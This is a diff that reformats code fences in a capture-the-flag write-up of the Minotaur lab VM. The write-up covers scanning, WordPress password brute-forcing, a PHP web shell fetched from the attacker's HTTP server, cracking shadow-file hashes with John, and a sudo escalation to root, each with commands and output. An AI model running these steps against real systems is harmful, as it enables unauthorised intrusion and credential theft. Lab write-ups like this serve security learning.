@@ -31,7 +31,8 @@ Once that was done, I went off to see what I could find...
 
 Starting off with NMap:
 
-```knightmare@kali:[~]$ sudo nmap -sSV -T5 minotaur.example.co.uk
+```
+knightmare@kali:[~]$ sudo nmap -sSV -T5 minotaur.example.co.uk
 
 Starting Nmap 7.10SVN ( https://nmap.org ) at 2016-04-13 15:10 BST
 Nmap scan report for minotaur.example.co.uk (192.168.100.44)
@@ -45,7 +46,8 @@ MAC Address: 00:0C:29:49:E8:02 (VMware)
 Service Info: Host: minotaur; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds```
+Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds
+```
 
 Some services there, Apache seems to be worth a prod, so let's check it out.
 
@@ -53,12 +55,14 @@ Some services there, Apache seems to be worth a prod, so let's check it out.
 
 Apache is listening there, and FTP on a funny port. I'll take a dump (tee hee!) of the webserver:
 
-```knightmare@kali:[~]$ links -dump http://minotaur.example.co.uk | head -n5
+```
+knightmare@kali:[~]$ links -dump http://minotaur.example.co.uk | head -n5
    Ubuntu Logo Apache2 Ubuntu Default Page
    It works!
 
    This is the default welcome page used to test the correct operation of the
-   Apache2 server after installation on Ubuntu systems. It is based on the```
+   Apache2 server after installation on Ubuntu systems. It is based on the
+```
 
 Hmm, basic apache page. At least it *feels* like Ubuntu now. time to abuse it with dirb.
 
@@ -66,7 +70,8 @@ Hmm, basic apache page. At least it *feels* like Ubuntu now. time to abuse it wi
 
 Setting off dirb, we find something interesting. I've edited the output slightly here:
 
-```knightmare@kali:[~/hack/web/dirb]$ ./dirb http://minotaur.example.co.uk wordlists/big.txt
+```
+knightmare@kali:[~/hack/web/dirb]$ ./dirb http://minotaur.example.co.uk wordlists/big.txt
 
 ----------------- DIRB v2.22 By The Dark Raver -----------------
 START_TIME: Wed Apr 13 15:14:24 2016
@@ -116,7 +121,8 @@ GENERATED WORDS: 20458
 ==> DIRECTORY: http://minotaur.example.co.uk/bull/wp-content/plugins/akismet/views/
 
 END_TIME: Wed Apr 13 15:15:03 2016
-DOWNLOADED: 184122 - FOUND: 1```
+DOWNLOADED: 184122 - FOUND: 1
+```
 
 So, under the bull subdirectory, we have what appears to be a wordpress install. Oh Joy!
 
@@ -124,7 +130,8 @@ So, under the bull subdirectory, we have what appears to be a wordpress install.
 
 So we can now fire WPScan and let it do the heavy lifting for us:
 
-```knightmare@kali:[~/hack/web/wordpress/wpscan]$ ./wpscan.rb -e p,t,u -u http://minotaur.example.co.uk/bull
+```
+knightmare@kali:[~/hack/web/wordpress/wpscan]$ ./wpscan.rb -e p,t,u -u http://minotaur.example.co.uk/bull
 _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
@@ -308,7 +315,8 @@ _______________________________________________________________
 [+] Finished: Wed Apr 13 15:39:33 2016
 [+] Requests Done: 1476
 [+] Memory used: 118.477 MB
-[+] Elapsed time: 00:00:06```
+[+] Elapsed time: 00:00:06
+```
 
 Pfft! Hadly worth getting out of bed for... Still, it's a foothold into the server.
 
@@ -316,22 +324,27 @@ Pfft! Hadly worth getting out of bed for... Still, it's a foothold into the serv
 
 So we can now use CeWL to create a custom wordlist from the site:
 
-```knightmare@kali:[~/hack/passwords/cewl]$ ./cewl.rb -m 4 -w ../minotaur_dict.txt http://minotaur.example.co.uk/bull
+```
+knightmare@kali:[~/hack/passwords/cewl]$ ./cewl.rb -m 4 -w ../minotaur_dict.txt http://minotaur.example.co.uk/bull
 CeWL 5.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)
 knightmare@kali:[~/hack/passwords/cewl]$ cd .. ; wc -l minotaur_dict.txt
-116 minotaur_dict.txt```
+116 minotaur_dict.txt
+```
 
 Now we'll pass that wordlist into John The Ripper and mangle it up a little:
 
-```knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./john --wordlist=../../minotaur_dict.txt --rules --stdout > ../../minotaur_dict2.txt
+```
+knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./john --wordlist=../../minotaur_dict.txt --rules --stdout > ../../minotaur_dict2.txt
 Press 'q' or Ctrl-C to abort, almost any other key for status
-5784p 0:00:00:00 100.00% (2016-04-13 15:51) 11568p/s Platforming```
+5784p 0:00:00:00 100.00% (2016-04-13 15:51) 11568p/s Platforming
+```
 
 # Wordsmith
 
 So now we will try again with our custom wordlist: I've edited it for brevity in reading this article:
 
-```knightmare@kali:[~/hack/web/wordpress/wpscan]$ ./wpscan.rb -U bully -w ~/hack/passwords/minotaur_dict2.txt -u http://minotaur.example.co.uk/bull
+```
+knightmare@kali:[~/hack/web/wordpress/wpscan]$ ./wpscan.rb -U bully -w ~/hack/passwords/minotaur_dict2.txt -u http://minotaur.example.co.uk/bull
 _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
@@ -369,7 +382,8 @@ _______________________________________________________________
 [+] Finished: Wed Apr 13 15:55:28 2016
 [+] Requests Done: 5831
 [+] Memory used: 32.254 MB
-[+] Elapsed time: 00:01:41```
+[+] Elapsed time: 00:01:41
+```
 
 Now we an log into wordpress and try to gain the flag(s):
 
@@ -385,9 +399,11 @@ Now we can click on `Apperance > Editor >  Main Index Template` (index.php) and 
 
 In our shell (Oh Michelle!):
 
-```knightmare@kali:[~/hack/web/shells/phpshells]$ python -m SimpleHTTPServer
+```
+knightmare@kali:[~/hack/web/shells/phpshells]$ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
-192.168.100.44 - - [13/Apr/2016 17:01:31] "GET /knightmare_shell.php HTTP/1.1" 200 -```
+192.168.100.44 - - [13/Apr/2016 17:01:31] "GET /knightmare_shell.php HTTP/1.1" 200 -
+```
 
 Browsing to `http://minotaur.example.co.uk/bull/wp-content/themes/twentyfourteen/` triggers the download, although it gives a blank page.
 
@@ -397,7 +413,8 @@ We can now browse to `http://minotaur.example.co.uk/bull/wp-content/themes/twent
 
 Now we have a shell, we can jump to the terminal page in the shell, and do some enumaration:
 
-```/var/www/html/bull/> cd ...
+```
+/var/www/html/bull/> cd ...
 /var/www/html/>ls
 bull
 flag.txt
@@ -406,11 +423,13 @@ index.html
 /var/www/html/>cat flag.txt
 Oh, lookey here. A flag!
 Th15 15 @N 3@5y f1@G!
-/var/www/html/>	```
+/var/www/html/>	
+```
 
 That's Interesting, but of no use to us. Let's do some basic enumeration:
 
-```/var/www/html/>
+```
+/var/www/html/>
 /tmp/>cat flag.txt
 That shadow.bak file is probably useful, hey?
 Also, you found a flag!
@@ -483,7 +502,8 @@ h0rnbag:x:1002:1002:,,,:/home/h0rnbag:/bin/bash
 
 Oh dear! Password file right there in plain text. Well, that's just not cricket! Only thing to do now, is to crack those hashes:
 
-```knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./unshadow /tmp/passwd /tmp/shadow > /tmp/minotaur
+```
+knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./unshadow /tmp/passwd /tmp/shadow > /tmp/minotaur
 knightmare@kali:[~/hack/passwords/john-1.8.0-jumbo-1/run]$ ./john /tmp/minotaur
 Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
 Use the "--format=crypt" option to force loading these as that type instead
@@ -501,7 +521,8 @@ Hmm, so we now have a couple of logins. Let's test them.
 
 Logging in as heffer:
 
-```knightmare@kali:[~]$ ssh heffer@minotaur.example.co.uk
+```
+knightmare@kali:[~]$ ssh heffer@minotaur.example.co.uk
 heffer@minotaur.example.co.uk's password:
 Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.16.0-30-generic i686)
 
@@ -533,11 +554,13 @@ drwx------ 2 heffer heffer 4096 May 27  2015 .cache
 -rw------- 1 heffer heffer   54 Apr 14 02:23 .Xauthority
 heffer@minotaur:~$ cat flag.txt
 So this was an easy flag to get, hopefully. Have you gotten ~minotaur/flag.txt yet?
-Th3 fl@G 15: m00000 y0```
+Th3 fl@G 15: m00000 y0
+```
 
 Hmm, so we need to check on some things. Luck for us we have the other password :-)
 
-```heffer@minotaur:~$ su minotaur
+```
+heffer@minotaur:~$ su minotaur
 Password:
 minotaur@minotaur:/home/heffer$ id
 uid=1000(minotaur) gid=1000(minotaur) groups=1000(minotaur),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),113(sambashare)
@@ -548,7 +571,8 @@ minotaur@minotaur:~$ cat flag.txt
 Congrats! You've found the first flag:
 M355 W17H T3H 8ULL, G37 73H H0RN!
 
-But can you get /root/flag.txt ?```
+But can you get /root/flag.txt ?
+```
 
 So we need a way to become root. Dang!
 
@@ -556,18 +580,21 @@ So we need a way to become root. Dang!
 
 So let's now enumerate what the minotaur user can do:
 
-```minotaur@minotaur:~$ lsb_release -a
+```
+minotaur@minotaur:~$ lsb_release -a
 No LSB modules are available.
 Distributor ID: Ubuntu
 Description:    Ubuntu 14.04.2 LTS
 Release:        14.04
 Codename:       trusty
 minotaur@minotaur:~$ which gcc
-/usr/bin/gcc```
+/usr/bin/gcc
+```
 
 We could, at this point, use the Ubuntu overlay exploit ere, but let's not:
 
-```minotaur@minotaur:~$ sudo -l
+```
+minotaur@minotaur:~$ sudo -l
 Matching Defaults entries for minotaur on minotaur:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -581,7 +608,8 @@ root@minotaur:/root# ls
 flag.txt  peda  quotes.txt
 root@minotaur:/root# cat flag.txt
 Congrats! You got the final flag!
-Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35```
+Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
+```
 
 Tsk! Was easy in the end... Still one more notch on the keyboard case. With many thanks to [https://twitter.com/@RobertWinkel] (Robert Winkel) for this VM.
 
